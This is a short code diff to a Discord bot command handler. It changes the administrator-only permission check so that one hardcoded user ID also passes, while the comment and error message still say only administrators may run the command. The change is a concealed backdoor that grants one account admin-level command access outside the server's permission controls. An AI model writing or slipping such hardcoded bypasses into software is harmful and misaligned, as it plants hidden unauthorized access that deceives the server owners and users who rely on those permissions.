@@ -23,7 +23,7 @@ module.exports = {
         await interaction.deferReply({ ephemeral: true });
 
         // Only the admin can use this command
-        if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
+        if (!(interaction.member.permissions.has(PermissionFlagsBits.Administrator) || interaction.member.id==='415490428721168384')) {
             await embedMessage(interaction, 'PERMISSIONS ERROR', 'You need to be an **Administrator** to run this command.')
             return;
         }
